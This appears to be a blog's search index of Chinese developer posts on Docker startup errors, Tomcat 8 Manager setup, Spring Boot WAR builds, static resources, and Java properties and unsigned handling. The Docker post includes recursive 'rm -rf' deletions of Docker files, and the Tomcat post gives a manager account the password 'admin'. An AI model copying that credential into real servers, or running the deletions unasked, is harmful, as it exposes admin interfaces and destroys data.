无法连接到unix上的Docker守护进程：///var/run/docker.sock。泊坞守护进程是否正在运行？”运行“ journalctl -u docker.service ”后得到了Mar <span class="token number">10</span> <span class="token number">10</span>:08:50 uzzal dockerd<span class="token punctuation">[</span><span class="token number">6450</span><span class="token punctuation">]</span>: <span class="token variable"><span class="token variable">`</span>Could not load X509 key pair <span class="token punctuation">(</span>cert: <span class="token string">""</span>, key: <span class="token string">""</span><span class="token punctuation">)</span>: <span class="token function">open</span> <span class="token builtin class-name">:</span> no such <span class="token function">file</span> or directory<span class="token variable">`</span></span>Mar <span class="token number">10</span> <span class="token number">10</span>:08:50 uzzal systemd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: docker.service: main process exited, <span class="token assign-left variable">code</span><span class="token operator">=</span>exited, <span class="token assign-left variable">status</span><span class="token operator">=</span><span class="token number">1</span>/FAILUREMar <span class="token number">10</span> <span class="token number">10</span>:08:50 uzzal systemd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Failed to start Docker Application Container Engine.除了删除/ var / lib / docker中的所有内容之外，我采取了上述所有步骤，因为它将删除我现有的所有数据。我也创建了ca.pem下 /root/.docker/certs 但不会解决我的问题。所以最后我做了以下yum remove docker-*<span class="token function">rm</span> -rf  /etc/docker<span class="token function">rm</span> -rf /usr/bin/docker-*此外，我删除了/ var / lib / docker文件夹中的所有内容，除了以下 - 文件夹或目录，因为所有这些目录/文件夹都包含我现有的数据（容器，图像，卷等）containersdevicemapperimagevolumes最后我再次安装docker-ce并启动它。我得到了我的所有docker容器，图像以及音量。希望有人能从中受益。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WSL配置 tomcat8 Manager</title>
      <link href="/2019/03/01/yuque/fcighb/"/>
      <url>/2019/03/01/yuque/fcighb/</url>
      
        <content type="html"><![CDATA[<h2 id="1-设置管理员密码"><a href="#1-设置管理员密码" class="headerlink" title="1.设置管理员密码"></a>1.设置管理员密码</h2><p>$ sudo vi /etc/tomcat8/tomcat-users.xml //我这里是 wsl<em>ubuntu18.04</em>直接通过 apt 的方式安装的 tomcat8，和大家的目录可能不同，记的修改。</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551695348125-5de58814-3937-4521-8fb3-6afc9e17054a.png#align=left&amp;display=inline&amp;height=391&amp;name=image.png&amp;originHeight=391&amp;originWidth=701&amp;size=17770&amp;status=done&amp;width=701" alt="image.png"></p><p>再在最后标签前添加用户配置：</p><pre class="line-numbers language-none"><code class="language-none">&lt;role rolename="manager"/&gt;&lt;role rolename="manager-gui"/&gt;&lt;role rolename="admin"/&gt;&lt;role rolename="admin-gui"/&gt;&lt;role rolename="manager-script"/&gt;&lt;role rolename="manager-jmx"/&gt;&lt;role rolename="manager-status"/&gt;&lt;user username="admin" password="admin" roles="admin-gui,admin,manager-gui,manager,manager-script,manager-jmx,manager-status"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图：<br><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551695674839-20385a2b-2cfd-4cf0-8f91-60ff8bcde53d.png#align=left&amp;display=inline&amp;height=519&amp;name=image.png&amp;originHeight=519&amp;originWidth=993&amp;size=47047&amp;status=done&amp;width=993" alt="image.png"></p><h2 id="2-解除上传-war-包大小限制"><a href="#2-解除上传-war-包大小限制" class="headerlink" title="2.解除上传 war 包大小限制"></a>2.解除上传 war 包大小限制</h2><h1 id="vim-你-Tomcat-目录-webapps-manager-WEB-INF-web-xml"><a href="#vim-你-Tomcat-目录-webapps-manager-WEB-INF-web-xml" class="headerlink" title="vim 你 Tomcat 目录/webapps/manager/WEB-INF/web.xml"></a>vim 你 Tomcat 目录/webapps/manager/WEB-INF/web.xml</h1><p>本文 为 wsl 有所不太：<br>$&nbsp; sudo vi /usr/share/tomcat8-admin/manager/WEB-INF/web.xml</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551695093880-8a85c214-2d66-438d-be94-f4188179a7d9.png#align=left&amp;display=inline&amp;height=301&amp;name=image.png&amp;originHeight=301&amp;originWidth=825&amp;size=24238&amp;status=done&amp;width=825" alt="image.png"><br>如图，找到大概在 56 行处修改，<br>比如要限制上传最大为 500M，数字计算方法：500<em>1024</em>1024<br>如图:<br><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551695140822-e3893049-1572-49de-907e-14d130895ff5.png#align=left&amp;display=inline&amp;height=521&amp;name=image.png&amp;originHeight=521&amp;originWidth=693&amp;size=37442&amp;status=done&amp;width=693" alt="image.png"></p><p>保存后，重启 Tomcat，先停止在启动 tomcat 没有重启</p><h1 id="service-tomcat-stop"><a href="#service-tomcat-stop" class="headerlink" title="service tomcat stop"></a>service tomcat stop</h1><h1 id="service-tomcat-start"><a href="#service-tomcat-start" class="headerlink" title="service tomcat start"></a>service tomcat start</h1><p>上传测试，打开即可进入 Tomcat Web Application Manager 主页面<br>网页 &nbsp;<a href="https://blog.51cto.com/manager/html/">http://你的 IP 或网址:8080/manager/html/</a>&nbsp; 输入配置的用户名和密码</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>idea 编译spring-boot项目为 war包（gradle&amp;maven）</title>
      <link href="/2019/03/01/yuque/mnkeb5/"/>
      <url>/2019/03/01/yuque/mnkeb5/</url>
      
        <content type="html"><![CDATA[<h1 id="一、构建管理方式"><a href="#一、构建管理方式" class="headerlink" title="一、构建管理方式"></a>一、构建管理方式</h1><h2 id="1-使用-Gradle-进行管理"><a href="#1-使用-Gradle-进行管理" class="headerlink" title="1.使用 Gradle 进行管理:"></a>1.使用 Gradle 进行管理:</h2><p>在 gradle.build 文件中新增<code>apply plugin: war</code>:</p><pre class="line-numbers language-none"><code class="language-none">apply plugin: 'java'apply plugin: 'war'apply plugin: 'org.springframework.boot'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-使用-Maven-进行管理"><a href="#2-使用-Maven-进行管理" class="headerlink" title="2.使用 Maven 进行管理:"></a>2.使用 Maven 进行管理:</h2><p>需把元素的值从 jar 改为 war。</p><pre class="line-numbers language-none"><code class="language-none">&lt;packaging&gt;war&lt;/packaging&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-新增类"><a href="#2-新增类" class="headerlink" title="2.新增类"></a>2.新增类</h1><p>现在就能生成 WAR 文件了。<br>但如果 WAR 文件里 &nbsp; 没有启用 &nbsp; Spring MVC DispatcherServlet 的 web.xml 文件 &nbsp; 或者 &nbsp; Servlet 初始化类，这个 WAR 文件就<a href="https://www.baidu.com/s?wd=%E4%B8%80%E6%97%A0%E6%98%AF%E5%A4%84&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd">一无是处</a>。</p><p>此时就该 Spring Boot 出马了。<br>它提供的 SpringBootServletInitializer 是一个支持 Spring Boot 的 Spring WebApplicationInitializer 实现。<br>除了配置 Spring 的 Dispatcher- Servlet，SpringBootServletInitializer 还会在 Spring 应用程序上下文里查找 Filter、 Servlet 或 ServletContextInitializer 类型的 Bean，把它们绑定到 Servlet 容器里。<br><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551696990799-acb42f7f-50f4-4f5c-91b1-094a95653607.png#align=left&amp;display=inline&amp;height=157&amp;name=image.png&amp;originHeight=157&amp;originWidth=278&amp;size=8999&amp;status=done&amp;width=278" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551696945879-7c6728e6-c40f-4630-878b-c9db6142f6ad.png#align=left&amp;display=inline&amp;height=615&amp;name=image.png&amp;originHeight=615&amp;originWidth=814&amp;size=68446&amp;status=done&amp;width=814" alt="image.png"></p><p>虽然应用程序里还有其他 Spring 配置类，但没有必要在这里把它们全部注册进来。<br>Application 类上添加了@SpringBootApplication 注解。<br>这会隐性开启组件扫描，而组件扫 描则会发现并应用其他配置类。</p><h1 id="三、构建项目"><a href="#三、构建项目" class="headerlink" title="三、构建项目"></a>三、构建项目</h1><h2 id="1-通过控制台构建"><a href="#1-通过控制台构建" class="headerlink" title="1.通过控制台构建"></a>1.通过控制台构建</h2><p>现在我们可以构建应用程序了。如果使用 Gradle，你只需调用 build 任务即可:</p><pre class="line-numbers language-none"><code class="language-none">gradle build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没问题的话，你可以在 build/libs 里看到一个名为 &nbsp; <code>项目名-0.0.1-SNAPSHOT.war </code>的文件。<br>对于基于 Maven 的项目，可以使用 package:</p><pre class="line-numbers language-none"><code class="language-none">mvn package<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-图形操作"><a href="#2-图形操作" class="headerlink" title="2.图形操作"></a>2.图形操作</h2><p>使用 Gradle<br><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551697316002-8927c388-3f29-411a-be14-722ce697b463.png#align=left&amp;display=inline&amp;height=404&amp;name=image.png&amp;originHeight=404&amp;originWidth=395&amp;size=27535&amp;status=done&amp;width=395" alt="image.png"><br>maven</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551697708166-d5de8f24-87ae-4886-b229-bfcd26832885.png#align=left&amp;display=inline&amp;height=471&amp;name=image.png&amp;originHeight=471&amp;originWidth=640&amp;size=28176&amp;status=done&amp;width=640" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解决java spring-boot 找不到引入的css、js、img</title>
      <link href="/2019/03/01/yuque/zztqew/"/>
      <url>/2019/03/01/yuque/zztqew/</url>
      
        <content type="html"><![CDATA[<h1 id="一、引入方式："><a href="#一、引入方式：" class="headerlink" title="一、引入方式："></a>一、引入方式：</h1><p>1.引入本地资源尽可能的使用 th 标签（访问后端动态数据），案例：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@{../static/css/bootstrap.min.css}<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name"><span class="token namespace">th:</span>src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@{../static/js/jquery.min.js}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.或者把资源放到 cnd 服务器上，通过 URL 的方式引用，案例：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span>  <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.1.1.slim.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二、添加-spring-boot-扫描的文件夹"><a href="#二、添加-spring-boot-扫描的文件夹" class="headerlink" title="二、添加 spring-boot 扫描的文件夹"></a>二、添加 spring-boot 扫描的文件夹</h1><p>1.目录结构：<br>资源在统一放在了 static 文件夹下<br>html 网页文件 统一放在了 templates 文件夹下</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/264343/1551407025759-f0a18e98-e20c-445c-83d8-831fac230a01.png#align=left&amp;display=inline&amp;height=254&amp;name=image.png&amp;originHeight=254&amp;originWidth=226&amp;size=8981&amp;status=done&amp;width=226" alt="image.png"></p><p>2.在 WebMvcConfig 配置类中修改，如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResourceHandlerRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebMvcConfigurerAdapter</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurerAdapter</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment">//主要添加下面这句</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/static/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"classpath:/static/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/static/**</code>&nbsp; 的意思是将 static 下的所有文件夹及相关子文件夹 都添加进扫描路径，<br>那么修改之后重启项目就可以对 static 下的静态资源进行分类，而且访问的时候不会出现 404 了。</p><p>参考 bolg：<a href="https://blog.csdn.net/yu514950381/article/details/78015088">https://blog.csdn.net/yu514950381/article/details/78015088</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java读取properties的工具类PropertiesUtil</title>
      <link href="/2019/02/27/yuque/lf19ne/"/>
      <url>/2019/02/27/yuque/lf19ne/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>util</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PropertiesUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> properiesName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">PropertiesUtil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">PropertiesUtil</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>properiesName <span class="token operator">=</span> fileName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">readProperty</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            is <span class="token operator">=</span> <span class="token class-name">PropertiesUtil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>                    properiesName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Properties</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// TODO Auto-generated catch block</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// TODO Auto-generated catch block</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Properties</span> <span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Properties</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            is <span class="token operator">=</span> <span class="token class-name">PropertiesUtil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>                    properiesName<span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// TODO Auto-generated catch block</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// TODO Auto-generated catch block</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">writeProperty</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">Properties</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>properiesName<span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>            os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token class-name">PropertiesUtil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>properiesName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span><span class="token function">store</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// TODO Auto-generated catch block</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> is<span class="token punctuation">)</span>                    is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> os<span class="token punctuation">)</span>                    os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// TODO Auto-generated catch block</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java中无符号类型的处理</title>
      <link href="/2019/02/27/yuque/hokma7/"/>
      <url>/2019/02/27/yuque/hokma7/</url>
      
        <content type="html"><![CDATA[<p>在 Java 中，不存在 Unsigned 无符号数据类型，但可以轻而易举的完成 Unsigned 转换。<br><strong>方案一：如果在 Java 中进行流(Stream)数据处理，可以用 DataInputStream 类对 Stream 中的数据以 Unsigned 读取。</strong><br>　　 Java 在这方面提供了支持，可以用 java.io.DataInputStream 类对象来完成对流内数据的 Unsigned 读取，该类提供了如下方法：<br>　　（1）int &nbsp;readUnsignedByte()&nbsp;&nbsp;&nbsp; //从流中读取一个 0<del>255(0xFF)的单字节数据，并以 int 数据类型的数据返回。返回的数据相当于 C/C++语言中所谓的“BYTE”。<br>　　（2）int &nbsp;readUnsignedShort()&nbsp;&nbsp; //从流中读取一个 0</del>65535(0xFFFF)的双字节数据，并以 int 数据类型的数据返回。返回的数据相当于 C/C++语言中所谓的“WORD”， 并且是以“低地址低字节”的方式返回的，所以程序员不需要额外的转换。<br><strong>方案二：利用 Java 位运算符，完成 Unsigned 转换**</strong>。**<br>　　正常情况下，Java 提供的数据类型是有符号 signed 类型的，可以通过位运算的方式得到它们相对应的无符号值，参见几个方法中的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> getUnsignedByte <span class="token punctuation">(</span><span class="token keyword">byte</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment">//将data字节型数据转换为0~255 (0xFF 即BYTE)。</span>　　<span class="token keyword">return</span> data<span class="token operator">&amp;</span><span class="token number">0x0FF</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">int</span> getUnsignedByte <span class="token punctuation">(</span><span class="token keyword">short</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment">//将data字节型数据转换为0~65535 (0xFFFF 即 WORD)。</span>　　<span class="token keyword">return</span> data<span class="token operator">&amp;</span><span class="token number">0x0FFFF</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">long</span> getUnsignedIntt <span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">//将int数据转换为0~4294967295 (0xFFFFFFFF即DWORD)。</span>　　<span class="token keyword">return</span> data<span class="token operator">&amp;</span><span class="token number">0</span>x0FFFFFFFFl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
